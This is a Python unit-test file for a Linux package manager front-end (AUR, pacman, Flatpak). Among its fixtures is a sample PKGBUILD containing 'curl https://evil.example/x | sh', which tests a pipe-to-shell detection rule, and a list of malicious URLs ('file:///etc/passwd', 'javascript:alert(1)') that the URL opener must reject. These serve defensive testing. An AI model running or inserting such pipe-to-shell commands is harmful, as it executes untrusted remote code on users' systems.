import unittest
import json
from datetime import datetime, date, timezone
from unittest.mock import Mock, patch, mock_open, DEFAULT
from atlas.view.webview.api import AtlasApi, _json_safe, parse_pacman_log


class GetInstalledFilterTest(unittest.TestCase):
    def setUp(self):
        self.manager = Mock()
        self.api = AtlasApi(self.manager, Mock())

    def _pkg(self, name, runtime=False):
        p = Mock()
        p.name = name
        p.runtime = runtime
        p.description = ''; p.version = '1'; p.latest_version = '1'
        p.installed = True; p.update = False; p.icon_url = None; p.size = 1
        p.categories = []
        p.get_publisher.return_value = ''
        p.get_type.return_value = 'flatpak'
        for attr in ('can_be_run', 'can_be_downgraded', 'has_info', 'has_history',
                     'is_update_ignored', 'supports_ignored_updates'):
            getattr(p, attr).return_value = False
        return p

    def test_flatpak_runtimes_hidden_from_installed(self):
        app = self._pkg('GIMP', runtime=False)
        runtime = self._pkg('org.freedesktop.Platform', runtime=True)
        self.manager.read_installed.return_value = Mock(installed=[app, runtime])

        res = self.api.get_installed()

        names = [p['name'] for p in res['data']]
        self.assertIn('GIMP', names)
        self.assertNotIn('org.freedesktop.Platform', names)


class AurMetaTest(unittest.TestCase):
    """get_aur_meta: current maintainer, 'changed since install' advisory, and update detection."""

    def setUp(self):
        self.manager = Mock()
        self.api = AtlasApi(self.manager, Mock())

    def _setup(self, repository='aur', baseline=None, current='AlphaLynx', has_client=True,
               installed=True, version='2.0.6-1', latest='2.0.11-1'):
        pkg = Mock(name='pkg'); pkg.name = 'antigravity'; pkg.repository = repository
        pkg.maintainer = baseline; pkg.installed = installed; pkg.version = version
        self.api._get_pkg = Mock(return_value=pkg)
        arch_man = Mock()
        arch_man.aur_client.get_info.return_value = [{'Maintainer': current, 'Version': latest}]
        self.api._manager_by_gem = Mock(return_value=arch_man if has_client else None)
        return arch_man

    def test_no_baseline_shows_current_maintainer_without_change(self):
        self._setup(baseline=None, current='AlphaLynx')      # antigravity case
        data = self.api.get_aur_meta('antigravity')['data']
        self.assertEqual('AlphaLynx', data['maintainer'])
        self.assertIsNone(data['changed'])

    def test_changed_maintainer_flagged(self):
        self._setup(baseline='HurricanePootis', current='AlphaLynx')
        data = self.api.get_aur_meta('antigravity')['data']
        self.assertEqual({'old': 'HurricanePootis', 'new': 'AlphaLynx'}, data['changed'])

    def test_same_maintainer_not_flagged(self):
        self._setup(baseline='AlphaLynx', current='AlphaLynx')
        self.assertIsNone(self.api.get_aur_meta('antigravity')['data']['changed'])

    def test_now_orphaned_reported(self):
        self._setup(baseline='AlphaLynx', current=None)
        data = self.api.get_aur_meta('antigravity')['data']
        self.assertIsNone(data['maintainer'])
        self.assertEqual({'old': 'AlphaLynx', 'new': None}, data['changed'])

    def test_uninstalled_never_flags_maintainer_change(self):
        self._setup(baseline='HurricanePootis', current='AlphaLynx', installed=False)
        data = self.api.get_aur_meta('antigravity')['data']
        self.assertIsNone(data['changed'])

    def test_non_aur_returns_empty(self):
        self._setup(repository='core', baseline='x')
        self.assertEqual({}, self.api.get_aur_meta('bash')['data'])

    @patch('atlas.view.webview.api.run_cmd')
    def test_update_available_when_installed_is_older(self, mock_run):
        mock_run.return_value = "-1\n"
        # real vercmp: 2.0.6-1 < 2.0.11-1
        self._setup(installed=True, version='2.0.6-1', latest='2.0.11-1')
        data = self.api.get_aur_meta('antigravity')['data']
        self.assertEqual('2.0.11-1', data['latest_version'])
        self.assertTrue(data['update_available'])
        mock_run.assert_called_once_with('vercmp 2.0.6-1 2.0.11-1', print_error=False)

    @patch('atlas.view.webview.api.run_cmd')
    def test_no_update_when_versions_equal(self, mock_run):
        mock_run.return_value = "0\n"
        self._setup(installed=True, version='2.0.11-1', latest='2.0.11-1')
        self.assertFalse(self.api.get_aur_meta('antigravity')['data']['update_available'])
        mock_run.assert_called_once_with('vercmp 2.0.11-1 2.0.11-1', print_error=False)

    @patch('atlas.view.webview.api.run_cmd')
    def test_no_update_for_non_installed(self, mock_run):
        self._setup(installed=False, version='2.0.6-1', latest='2.0.11-1')
        self.assertFalse(self.api.get_aur_meta('antigravity')['data']['update_available'])
        mock_run.assert_not_called()

    def test_surfaces_votes_popularity_and_scores_from_rpc_info(self):
        # Regression: the pkg object lacks AUR stats; the score must come from the fresh RPC info
        # (a popular package is Trusted, not a misleading low 'Risk').
        arch_man = self._setup(baseline='alice', current='alice', installed=True)
        import time as _t
        arch_man.aur_client.get_info.return_value = [{
            'Maintainer': 'alice', 'Version': '2.0.6-1', 'NumVotes': 500, 'Popularity': 2.0,
            'OutOfDate': None, 'FirstSubmitted': int(_t.time() - 3 * 365.25 * 24 * 3600),
        }]
        data = self.api.get_aur_meta('antigravity')['data']
        self.assertEqual(500, data['votes'])
        self.assertEqual(2.0, data['popularity'])
        self.assertFalse(data['out_of_date'])
        self.assertEqual('trusted', data['risk']['tier'])
        self.assertGreaterEqual(data['risk']['score'], 70)
        self.assertTrue(data['risk']['breakdown'])


class AurCommentsTest(unittest.TestCase):
    """get_aur_comments: scrape + parse the AUR package page, per-session cache, fail-open."""

    PAGE = ('<div class="comments">'
            '<h4 class="comment-header"><a href="/account/alice">alice</a>'
            '<time datetime="2024-03-01T00:00:00Z">2024-03-01</time></h4>'
            '<div class="article-content"><p>works for me</p></div>'
            '</div>')

    def setUp(self):
        self.api = AtlasApi(Mock(), Mock())

    def _setup(self, repository='aur', base='foo', page=None, status=200):
        pkg = Mock(name='pkg'); pkg.name = 'foo'; pkg.repository = repository; pkg.base = base
        self.api._get_pkg = Mock(return_value=pkg)
        arch_man = Mock()
        arch_man.aur_client.get_info.return_value = [{'PackageBase': base}]
        self.api._manager_by_gem = Mock(return_value=arch_man)
        resp = Mock(); resp.status_code = status; resp.text = (self.PAGE if page is None else page)
        self.http = Mock(); self.http.get.return_value = resp
        self.api._http_client = Mock(return_value=self.http)
        return resp

    def test_non_aur_returns_empty(self):
        self._setup(repository='core')
        self.assertEqual([], self.api.get_aur_comments('foo')['data']['comments'])

    def test_parses_comments_from_page(self):
        self._setup()
        data = self.api.get_aur_comments('foo')['data']
        self.assertEqual(1, len(data['comments']))
        self.assertEqual('alice', data['comments'][0]['author'])
        self.assertEqual('https://aur.archlinux.org/packages/foo/', data['url'])

    def test_uses_packagebase_for_the_url(self):
        self._setup(base='foo-git')
        data = self.api.get_aur_comments('foo')['data']
        self.assertEqual('https://aur.archlinux.org/packages/foo-git/', data['url'])

    def test_result_is_cached_per_session(self):
        self._setup()
        self.api.get_aur_comments('foo')
        self.api.get_aur_comments('foo')
        self.http.get.assert_called_once()           # second call served from cache

    def test_non_200_fails_open_to_empty(self):
        self._setup(status=503)
        self.assertEqual([], self.api.get_aur_comments('foo')['data']['comments'])

    def test_fetch_exception_fails_open(self):
        self._setup()
        self.http.get.side_effect = RuntimeError('network down')
        self.assertEqual([], self.api.get_aur_comments('foo')['data']['comments'])


class PkgbuildViewTest(unittest.TestCase):
    """get_pkgbuild: AUR-only fetch + advisory scan + metadata for the first-class viewer."""

    def setUp(self):
        self.api = AtlasApi(Mock(), Mock())

    SAMPLE = (
        "# Maintainer: Jane Doe <jane@example.com>\n"
        "pkgname=demo\n"
        "pkgver=1.2.3\n"
        "url='https://example.com'\n"
        "source=(\"https://example.com/demo-$pkgver.tar.gz\")\n"
        "sha256sums=('abc123')\n"
        "build() {\n"
        "  curl https://evil.example/x | sh\n"
        "}\n"
    )

    def _setup(self, repository='aur', text=SAMPLE, has_man=True, base='demo', install_text=None,
               installed=False, commit=None, srcinfo_text=None):
        pkg = Mock(name='pkg'); pkg.name = 'demo'; pkg.repository = repository; pkg.base = base
        pkg.installed = installed; pkg.commit = commit
        self.api._get_pkg = Mock(return_value=pkg)
        arch_man = Mock()
        arch_man.fetch_pkgbuild.return_value = text
        # The .SRCINFO divergence check fetches '.SRCINFO'; route it to srcinfo_text and let every
        # other path fall through to .return_value (so the scriptlet/diff tests keep working).
        arch_man.fetch_aur_file.return_value = install_text
        arch_man.fetch_aur_file.side_effect = (
            lambda _base, path, commit=None: srcinfo_text if path == '.SRCINFO' else DEFAULT)
        arch_man.aur_client.get_info.return_value = [{'PackageBase': base}]
        self.api._manager_by_gem = Mock(return_value=arch_man if has_man else None)
        return arch_man

    def test_non_aur_returns_empty(self):
        self._setup(repository='core')
        self.assertEqual({}, self.api.get_pkgbuild('demo')['data'])

    def test_happy_path_scans_and_parses(self):
        self._setup()
        data = self.api.get_pkgbuild('demo')['data']
        self.assertEqual(self.SAMPLE, data['text'])
        self.assertEqual('demo', data['base'])
        self.assertEqual('Jane Doe <jane@example.com>', data['metadata']['maintainer'])
        self.assertIn('aur.archlinux.org', data['url'])
        # the `curl ... | sh` line trips the pipe-to-shell rule
        self.assertTrue(any(f['rule'] == 'pipe_to_shell' for f in data['findings']))
        self.assertGreaterEqual(data['summary']['warn'], 1)

    def test_fetch_failure_fails_open(self):
        self._setup(text=None)
        self.assertEqual({}, self.api.get_pkgbuild('demo')['data'])

    def test_base_resolved_from_aur_info(self):
        arch_man = self._setup(base='demo-git')
        data = self.api.get_pkgbuild('demo')['data']
        self.assertEqual('demo-git', data['base'])
        arch_man.fetch_pkgbuild.assert_called_once_with('demo-git')

    def test_files_list_has_pkgbuild_first(self):
        self._setup()
        data = self.api.get_pkgbuild('demo')['data']
        self.assertEqual('PKGBUILD', data['files'][0]['name'])
        self.assertEqual(self.SAMPLE, data['files'][0]['text'])

    def test_install_scriptlet_becomes_a_tab_and_folds_into_summary(self):
        pkgbuild_text = ("pkgname=demo\ninstall=$pkgname.install\nbuild() { make; }\n")
        # the .install scriptlet trips a rule (sudo) so it contributes a warn to the combined summary
        install_text = "post_install() { sudo systemctl enable demo; }\n"
        arch_man = self._setup(text=pkgbuild_text, install_text=install_text)
        data = self.api.get_pkgbuild('demo')['data']
        names = [f['name'] for f in data['files']]
        self.assertEqual(['PKGBUILD', 'demo.install'], names)
        arch_man.fetch_aur_file.assert_any_call('demo', 'demo.install')
        # combined summary counts findings from the scriptlet too
        self.assertGreaterEqual(data['summary']['warn'], 1)

    def test_no_diff_when_not_installed(self):
        self._setup(installed=False, commit='abc')
        self.assertEqual([], self.api.get_pkgbuild('demo')['data']['diff'])

    def test_diff_when_installed_commit_differs(self):
        # PKGBUILD without an install= line so fetch_aur_file is used only for the diff baseline
        new_text = "pkgname=demo\npkgver=2\nbuild() { make; }\n"
        old_text = "pkgname=demo\npkgver=1\nbuild() { make; }\n"
        arch_man = self._setup(text=new_text, installed=True, commit='oldsha')
        arch_man.fetch_aur_file.return_value = old_text
        data = self.api.get_pkgbuild('demo')['data']
        self.assertTrue(data['diff'])  # structured diff_lines, non-empty
        self.assertTrue(any(d['kind'] == 'add' for d in data['diff']))
        arch_man.fetch_aur_file.assert_any_call('demo', 'PKGBUILD', 'oldsha')

    def test_no_diff_when_unchanged(self):
        same = "pkgname=demo\npkgver=1\n"
        arch_man = self._setup(text=same, installed=True, commit='oldsha')
        arch_man.fetch_aur_file.return_value = same
        self.assertEqual([], self.api.get_pkgbuild('demo')['data']['diff'])

    def test_srcinfo_divergence_surfaces_a_finding(self):
        # PKGBUILD downloads from evil.example, but .SRCINFO (what reviewers read) only lists github.
        pkgbuild = ("pkgname=demo\npkgver=1\n"
                    "source=(\"https://evil.example/demo.tar.gz\")\nsha256sums=('abc')\n")
        srcinfo = "\tsource = https://github.com/foo/demo/archive/v1.tar.gz\n"
        self._setup(text=pkgbuild, srcinfo_text=srcinfo)
        data = self.api.get_pkgbuild('demo')['data']
        self.assertTrue(any(f['rule'] == 'srcinfo_source_divergence' for f in data['findings']))
        self.assertGreaterEqual(data['summary']['warn'], 1)

    def test_no_srcinfo_skips_divergence(self):
        # Same PKGBUILD, but no .SRCINFO available → the check is skipped, not a false positive.
        pkgbuild = ("pkgname=demo\npkgver=1\n"
                    "source=(\"https://evil.example/demo.tar.gz\")\nsha256sums=('abc')\n")
        self._setup(text=pkgbuild, srcinfo_text=None)
        data = self.api.get_pkgbuild('demo')['data']
        self.assertFalse(any(f['rule'] == 'srcinfo_source_divergence' for f in data['findings']))


class CommandTest(unittest.TestCase):
    """get_command: the equivalent terminal command per source/action ("copy exact command")."""

    def setUp(self):
        self.api = AtlasApi(Mock(), Mock())

    def _pkg(self, name='vim', ptype='arch_repo', repository='extra', app_id=None, base=None):
        p = Mock(); p.name = name; p.get_type.return_value = ptype; p.gem_name = 'arch'
        p.repository = repository; p.id = app_id; p.package_base = base
        self.api._get_pkg = Mock(return_value=p)
        return p

    def test_repo_install_and_uninstall(self):
        self._pkg(name='vim', ptype='arch_repo', repository='extra')
        self.assertEqual('sudo pacman -S vim', self.api.get_command('arch_repo:vim', 'install')['data']['command'])
        self.assertEqual('sudo pacman -Rns vim', self.api.get_command('arch_repo:vim', 'uninstall')['data']['command'])

    def test_aur_install_uses_base_and_notes_helper(self):
        self._pkg(name='yay', ptype='aur', repository='aur', base='yay')
        d = self.api.get_command('aur:yay', 'install')['data']
        self.assertEqual('git clone https://aur.archlinux.org/yay.git && cd yay && makepkg -si', d['command'])
        self.assertIn('paru -S yay', d['note'])

    def test_aur_uninstall_is_pacman(self):
        self._pkg(name='yay', ptype='aur', repository='aur', base='yay')
        self.assertEqual('sudo pacman -Rns yay', self.api.get_command('aur:yay', 'uninstall')['data']['command'])

    def test_flatpak_actions(self):
        self._pkg(name='Dropbox', ptype='flatpak', repository=None, app_id='com.dropbox.Client')
        self.assertEqual('flatpak install flathub com.dropbox.Client', self.api.get_command('flatpak:Dropbox', 'install')['data']['command'])
        self.assertEqual('flatpak update com.dropbox.Client', self.api.get_command('flatpak:Dropbox', 'update')['data']['command'])
        self.assertEqual('flatpak uninstall com.dropbox.Client', self.api.get_command('flatpak:Dropbox', 'uninstall')['data']['command'])

    def test_unsupported_action_returns_empty_command(self):
        self._pkg(name='vim', ptype='arch_repo', repository='extra')
        self.assertEqual('', self.api.get_command('arch_repo:vim', 'downgrade')['data']['command'])

    def test_unknown_pkg_errors(self):
        self.api._get_pkg = Mock(return_value=None)
        self.assertEqual('error', self.api.get_command('nope:nope')['status'])


class FlatpakOverrideCommandTest(unittest.TestCase):
    """The set_flatpak_* permission methods return the exact `flatpak override` they ran (copyable
    in the toast — "nothing hidden from CLI users")."""

    def setUp(self):
        self.api = AtlasApi(Mock(), Mock())
        self.pkg = Mock(); self.pkg.id = 'org.x.App'
        self.man = Mock()
        self.man.set_permission.return_value = True
        self.man.set_filesystem_permission.return_value = True
        self.man.set_bus_permission.return_value = True
        self.man.set_env_permission.return_value = True
        self.api._flatpak_pkg_and_manager = Mock(return_value=(self.pkg, self.man))

    def test_toggle_returns_command(self):
        r = self.api.set_flatpak_override('flatpak:App', 'share:network', True)
        self.assertEqual('ok', r['status'])
        self.assertEqual('flatpak override --user --share=network org.x.App', r['command'])

    def test_filesystem_returns_command(self):
        r = self.api.set_flatpak_filesystem('flatpak:App', 'home', True, 'ro')
        self.assertEqual('flatpak override --user --filesystem=home:ro org.x.App', r['command'])

    def test_bus_returns_command(self):
        r = self.api.set_flatpak_bus('flatpak:App', 'session', 'org.foo', 'talk', True)
        self.assertEqual('flatpak override --user --talk-name=org.foo org.x.App', r['command'])

    def test_env_returns_command(self):
        r = self.api.set_flatpak_env('flatpak:App', 'GTK_THEME', 'Adwaita', True)
        self.assertEqual('flatpak override --user --env=GTK_THEME=Adwaita org.x.App', r['command'])

    def test_failure_has_no_command(self):
        self.man.set_permission.return_value = False
        r = self.api.set_flatpak_override('flatpak:App', 'share:network', True)
        self.assertEqual('error', r['status'])
        self.assertNotIn('command', r)


class ActivityLogTest(unittest.TestCase):
    """clear_activity / export_activity wrappers over the activity log."""

    def setUp(self):
        self.api = AtlasApi(Mock(), Mock())

    @patch('atlas.view.webview.api.clear_activity_log', return_value=True)
    def test_clear_ok(self, mock_clear):
        self.assertEqual('ok', self.api.clear_activity()['status'])
        mock_clear.assert_called_once()

    @patch('atlas.view.webview.api.clear_activity_log', return_value=False)
    def test_clear_failure_is_error(self, mock_clear):
        self.assertEqual('error', self.api.clear_activity()['status'])

    @patch('atlas.view.webview.api.get_activity_log', return_value=[{'a': 1}, {'b': 2}])
    @patch('atlas.view.webview.api.export_activity_log', return_value='/home/u/atlas-activity.json')
    def test_export_returns_path_and_count(self, mock_export, mock_get):
        r = self.api.export_activity()
        self.assertEqual('ok', r['status'])
        self.assertEqual('/home/u/atlas-activity.json', r['data']['path'])
        self.assertEqual(2, r['data']['count'])

    @patch('atlas.view.webview.api.export_activity_log', side_effect=OSError('disk full'))
    def test_export_failure_is_error(self, mock_export):
        self.assertEqual('error', self.api.export_activity()['status'])


class SerializeSortFieldsTest(unittest.TestCase):
    """The Sort dropdown's 'recently updated' mode needs last_modified serialized."""

    def setUp(self):
        self.manager = Mock()
        self.api = AtlasApi(self.manager, Mock())

    def _pkg(self, name, last_modified):
        p = Mock()
        p.name = name
        p.description = ''; p.version = '1'; p.latest_version = '1'; p.installed = False
        p.update = False; p.icon_url = None; p.size = 1; p.categories = []
        p.votes = 42; p.popularity = 3.5; p.last_modified = last_modified
        p.get_publisher.return_value = ''
        p.get_type.return_value = 'aur'
        for a in ('can_be_run', 'can_be_downgraded', 'has_info', 'has_history',
                  'is_update_ignored', 'supports_ignored_updates'):
            getattr(p, a).return_value = False
        return p

    def test_last_modified_votes_popularity_serialized(self):
        data = self.api._serialize_pkg(self._pkg('yay', 1700000000))
        self.assertEqual(1700000000, data['last_modified'])
        self.assertEqual(42, data['votes'])
        self.assertEqual(3.5, data['popularity'])


class FlatpakIconFallbackTest(unittest.TestCase):
    """Flatpak search results carry no icon; _serialize_pkg derives the predictable Flathub CDN URL."""

    def setUp(self):
        self.api = AtlasApi(Mock(), Mock())

    def _pkg(self, type_, app_id, icon_url=None):
        p = Mock()
        p.name = 'X'; p.description = ''; p.version = '1'; p.latest_version = '1'
        p.installed = False; p.update = False; p.icon_url = icon_url; p.size = 1; p.categories = []
        p.id = app_id
        p.get_publisher.return_value = ''
        p.get_type.return_value = type_
        for a in ('can_be_run', 'can_be_downgraded', 'has_info', 'has_history',
                  'is_update_ignored', 'supports_ignored_updates'):
            getattr(p, a).return_value = False
        return p

    def test_flatpak_without_icon_gets_flathub_cdn_url(self):
        data = self.api._serialize_pkg(self._pkg('flatpak', 'com.valvesoftware.Steam'))
        self.assertEqual('https://dl.flathub.org/repo/appstream/x86_64/icons/128x128/com.valvesoftware.Steam.png',
                         data['icon_url'])

    def test_flatpak_with_existing_icon_is_not_overridden(self):
        data = self.api._serialize_pkg(self._pkg('flatpak', 'com.x.Y', icon_url='data:image/png;base64,AAAA'))
        self.assertEqual('data:image/png;base64,AAAA', data['icon_url'])

    def test_non_flatpak_gets_no_cdn_fallback(self):
        data = self.api._serialize_pkg(self._pkg('aur', None))
        self.assertEqual('', data['icon_url'])


class FlatpakMetaTest(unittest.TestCase):
    """get_flatpak_meta dispatches to the flatpak gem only for Flatpak packages."""

    def setUp(self):
        self.api = AtlasApi(Mock(), Mock())

    def test_non_flatpak_returns_empty(self):
        pkg = Mock(); pkg.id = 'x'; pkg.get_type.return_value = 'aur'
        with patch.object(self.api, '_get_pkg', return_value=pkg):
            res = self.api.get_flatpak_meta('aur:x')
        self.assertEqual({}, res['data'])

    def test_flatpak_dispatches_to_gem(self):
        pkg = Mock(); pkg.id = 'org.gimp.GIMP'; pkg.get_type.return_value = 'flatpak'
        gem = Mock()
        gem.get_flathub_metadata.return_value = {'is_free': True, 'verified': True,
                                                 'installs_last_month': 67823}
        with patch.object(self.api, '_get_pkg', return_value=pkg), \
             patch.object(self.api, '_manager_by_gem', return_value=gem):
            res = self.api.get_flatpak_meta('flatpak:gimp')
        self.assertTrue(res['data']['is_free'])
        self.assertTrue(res['data']['verified'])
        gem.get_flathub_metadata.assert_called_once_with('org.gimp.GIMP')


class InstalledIconResolveTest(unittest.TestCase):
    """get_pkg_icon: resolve an installed app's icon from .desktop / icon theme dirs."""

    def setUp(self):
        self.api = AtlasApi(Mock(), Mock())

    def test_desktop_icon_name_parsing(self):
        self.assertEqual('firefox', self.api._desktop_icon_name('[Desktop Entry]\nName=Firefox\nIcon=firefox\n'))
        self.assertIsNone(self.api._desktop_icon_name('[Desktop Entry]\nName=X\n'))

    def test_find_icon_file_searches_standard_dirs(self):
        import tempfile, os
        d = tempfile.mkdtemp()
        apps = os.path.join(d, 'hicolor', 'scalable', 'apps')
        os.makedirs(apps)
        open(os.path.join(apps, 'gimp.svg'), 'w').close()
        with patch.object(AtlasApi, '_ICON_DIRS', (apps,)):
            self.assertTrue(self.api._find_icon_file('gimp').endswith('gimp.svg'))
            self.assertIsNone(self.api._find_icon_file('nonexistent'))

    def test_find_icon_file_accepts_absolute_path(self):
        import tempfile, os
        fd, p = tempfile.mkstemp(suffix='.png'); os.close(fd)
        self.assertEqual(p, self.api._find_icon_file(p))
        self.assertIsNone(self.api._find_icon_file('/no/such/icon.png'))

    def _make_theme(self, base, name, directories, inherits=None, files=None):
        """Write a minimal icon theme (index.theme + the named app dirs/files) under `base`."""
        import os
        root = os.path.join(base, name)
        os.makedirs(root, exist_ok=True)
        lines = ['[Icon Theme]', f'Name={name}',
                 'Directories=' + ','.join(d['dir'] for d in directories)]
        if inherits:
            lines.append('Inherits=' + ','.join(inherits))
        for d in directories:
            lines += ['', f"[{d['dir']}]", f"Context={d.get('context', 'Applications')}",
                      f"Size={d.get('size', 48)}", f"Type={d.get('type', 'Threshold')}"]
        with open(os.path.join(root, 'index.theme'), 'w') as f:
            f.write('\n'.join(lines) + '\n')
        for rel in (files or []):
            full = os.path.join(root, rel)
            os.makedirs(os.path.dirname(full), exist_ok=True)
            open(full, 'w').close()

    def test_find_icon_file_searches_active_theme(self):
        import tempfile, os
        base = tempfile.mkdtemp()
        # a theme-only icon (konsole) that hicolor/pixmaps wouldn't have
        self._make_theme(base, 'Papirusish',
                         [{'dir': '48x48/apps'}, {'dir': 'scalable/apps', 'type': 'Scalable'}],
                         files=['scalable/apps/konsole.svg', '48x48/apps/konsole.png'])
        with patch.object(AtlasApi, '_ICON_BASE_DIRS', (base,)), \
             patch.object(AtlasApi, '_ICON_DIRS', ()), \
             patch.object(self.api, '_active_icon_theme', return_value='Papirusish'):
            found = self.api._find_icon_file('konsole')
        # scalable (svg) is preferred over the raster size dir
        self.assertTrue(found.endswith('scalable/apps/konsole.svg'), found)

    def test_theme_app_dirs_follows_inherits_and_skips_non_app_context(self):
        import tempfile, os
        base = tempfile.mkdtemp()
        self._make_theme(base, 'Child', [{'dir': 'apps'}], inherits=['Parent'],
                         files=['apps/foo.svg'])
        self._make_theme(base, 'Parent',
                         [{'dir': '32x32/apps'}, {'dir': '32x32/mimetypes', 'context': 'MimeTypes'}],
                         files=['32x32/apps/bar.svg', '32x32/mimetypes/text.svg'])
        with patch.object(AtlasApi, '_ICON_BASE_DIRS', (base,)), \
             patch.object(self.api, '_active_icon_theme', return_value='Child'):
            self.api.__dict__.pop('_theme_icon_dirs_cache', None)
            dirs = self.api._theme_icon_dirs()
        # child app dir comes before inherited parent; mimetypes (non-app) excluded
        self.assertTrue(dirs[0].endswith('Child/apps'))
        self.assertTrue(any(d.endswith('Parent/32x32/apps') for d in dirs))
        self.assertFalse(any('mimetypes' in d for d in dirs))

    def test_active_icon_theme_reads_gtk_settings_when_no_gsettings(self):
        import tempfile, os
        # no gsettings → falls back to gtk-3.0 settings.ini
        cfg = tempfile.mkdtemp()
        ini = os.path.join(cfg, 'settings.ini')
        with open(ini, 'w') as f:
            f.write('[Settings]\ngtk-icon-theme-name=Breezish\n')
        with patch('atlas.view.webview.api.run_cmd', return_value=''), \
             patch('os.path.expanduser', return_value=ini):
            self.api.__dict__.pop('_icon_theme_name', None)
            self.assertEqual('Breezish', self.api._active_icon_theme())

    def test_get_pkg_icon_empty_for_non_installed(self):
        pkg = Mock(); pkg.installed = False; pkg.name = 'x'
        with patch.object(self.api, '_get_pkg', return_value=pkg):
            res = self.api.get_pkg_icon('aur:x')
        self.assertEqual('ok', res['status'])
        self.assertEqual('', res['data'])

    def test_get_pkg_icon_resolves_and_caches_for_installed(self):
        pkg = Mock(); pkg.installed = True; pkg.name = 'gimp'
        with patch.object(self.api, '_get_pkg', return_value=pkg), \
             patch.object(self.api, '_resolve_installed_icon', return_value='data:image/png;base64,AAAA') as mock_resolve:
            r1 = self.api.get_pkg_icon('arch:gimp')
            r2 = self.api.get_pkg_icon('arch:gimp')  # cached → resolver not called again
        self.assertEqual('data:image/png;base64,AAAA', r1['data'])
        self.assertEqual('data:image/png;base64,AAAA', r2['data'])
        mock_resolve.assert_called_once()


class GetOrphansTest(unittest.TestCase):
    def setUp(self):
        self.manager = Mock()
        self.api = AtlasApi(self.manager, Mock())

    def _pkg(self, name, ptype):
        p = Mock()
        p.name = name
        p.description = ''; p.version = '1'; p.latest_version = '1'; p.installed = True
        p.update = False; p.icon_url = None; p.size = 1; p.categories = []
        p.get_publisher.return_value = ''
        p.get_type.return_value = ptype
        for a in ('can_be_run', 'can_be_downgraded', 'has_info', 'has_history',
                  'is_update_ignored', 'supports_ignored_updates'):
            getattr(p, a).return_value = False
        return p

    def _arch_man(self, orphan_names):
        m = Mock()
        m.__module__ = 'atlas.gems.arch.controller'
        m.list_orphans.return_value = set(orphan_names)
        return m

    def test_returns_only_real_arch_orphans(self):
        arch = self._arch_man({'gjs', 'gutenprint'})
        self.manager.managers = [arch]
        # a real orphan, a non-orphan arch pkg, and a flatpak that happens to share an
        # orphan name (must NOT be treated as an Arch orphan)
        self.manager.read_installed.return_value = Mock(installed=[
            self._pkg('gjs', 'arch_repo'),
            self._pkg('firefox', 'arch_repo'),
            self._pkg('gutenprint', 'flatpak'),
        ])
        res = self.api.get_orphans()
        names = [p['name'] for p in res['data']]
        self.assertEqual(['gjs'], names)

    def test_no_orphans_short_circuits(self):
        arch = self._arch_man(set())
        self.manager.managers = [arch]
        res = self.api.get_orphans()
        self.assertEqual([], res['data'])
        self.manager.read_installed.assert_not_called()

    def test_orphan_count_is_cheap(self):
        arch = self._arch_man({'gjs', 'gutenprint', 'cpptrace'})
        self.manager.managers = [arch]
        res = self.api.get_orphan_count()
        self.assertEqual('ok', res['status'])
        self.assertEqual(3, res['count'])
        self.manager.read_installed.assert_not_called()  # count must not read_installed


class OpenUrlTest(unittest.TestCase):
    def setUp(self):
        self.api = AtlasApi(Mock(), Mock())

    @patch('atlas.view.webview.api.webbrowser.open')
    def test_opens_http_url(self, mock_open):
        res = self.api.open_url('https://aur.archlinux.org/packages/antigravity')
        self.assertEqual('ok', res['status'])
        mock_open.assert_called_once_with('https://aur.archlinux.org/packages/antigravity')

    @patch('atlas.view.webview.api.webbrowser.open')
    def test_rejects_non_http_scheme(self, mock_open):
        for bad in ['file:///etc/passwd', 'javascript:alert(1)', '', None, 'aur.archlinux.org']:
            res = self.api.open_url(bad)
            self.assertEqual('error', res['status'])
        mock_open.assert_not_called()

    @patch('atlas.view.webview.api.webbrowser.open')
    def test_rejects_malformed_or_control_character_http_urls(self, mock_open):
        for bad in ['https://', 'https:///missing-host', 'https://example.com/\nfile:///etc/passwd',
                    'https://example.com/\x00payload', 'http://exa mple.com/path']:
            res = self.api.open_url(bad)
            self.assertEqual('error', res['status'])
        mock_open.assert_not_called()

    @patch('atlas.view.webview.api.webbrowser.open')
    def test_accepts_case_insensitive_http_scheme(self, mock_open):
        res = self.api.open_url('HTTPS://example.invalid/path')
        self.assertEqual('ok', res['status'])
        mock_open.assert_called_once_with('HTTPS://example.invalid/path')


class AppSettingsTest(unittest.TestCase):
    def setUp(self):
        self.manager = Mock()
        self.api = AtlasApi(self.manager, Mock())
        # core config
        self.core = {
            'gems': None,
            'suggestions': {'enabled': True, 'by_type': 15},
            'system': {'notifications': True, 'single_dependency_checking': False},
            'updates': {'check_interval': 5, 'ask_for_reboot': True},
            'download': {'icons': True},
            'store_root_password': True,
            'ui': {'tray': {'enabled': True, 'minimize_to_tray': False, 'update_check_interval': 60}},
        }
        self.manager.configman.get_config.return_value = self.core

        # two managers: an arch one (works) and a flatpak one (works) with a config manager
        def mk(modname, enabled, can_work):
            m = Mock()
            m.__module__ = f'atlas.gems.{modname}.controller'
            m.is_enabled.return_value = enabled
            m.can_work.return_value = (can_work, None)
            return m
        self.arch = mk('arch', True, True)
        self.arch.configman.get_config.return_value = {'aur_check_pkgbuild': True}
        self.flatpak = mk('flatpak', True, True)
        self.flatpak.configman.get_config.return_value = {'installation_level': 'user'}
        self.manager.managers = [self.arch, self.flatpak]

    def test_get_app_settings_shape(self):
        res = self.api.get_app_settings()
        self.assertEqual('ok', res['status'])
        data = res['data']
        ids = {t['id'] for t in data['types']}
        self.assertEqual({'arch', 'flatpak'}, ids)
        self.assertTrue(data['flatpak_available'])
        self.assertEqual('user', data['flatpak_installation_level'])
        self.assertTrue(data['general']['suggestions_enabled'])

    def test_save_app_settings_writes_gems_and_applies_live(self):
        res = self.api.save_app_settings({'types': {'arch': True, 'flatpak': False},
                                          'general': {'suggestions_enabled': False},
                                          'flatpak_installation_level': 'system'})
        self.assertEqual('ok', res['status'])
        # gems list written (enabled only) + general toggle applied
        self.assertEqual(['arch'], self.core['gems'])
        self.assertFalse(self.core['suggestions']['enabled'])
        self.manager.configman.save_config.assert_called_once_with(self.core)
        # live apply: set_enabled called per manager
        self.arch.set_enabled.assert_called_once_with(True)
        self.flatpak.set_enabled.assert_called_once_with(False)
        # flatpak level persisted
        self.flatpak.configman.save_config.assert_called_once()

    def test_save_app_settings_invalid_flatpak_level_falls_back_to_ask(self):
        self.api.save_app_settings({'flatpak_installation_level': 'bogus'})
        saved = self.flatpak.configman.save_config.call_args[0][0]
        self.assertIsNone(saved['installation_level'])

    def test_greeting_name_round_trip(self):
        # default: no custom name set
        self.assertEqual('', self.api.get_app_settings()['data']['general']['greeting_name'])
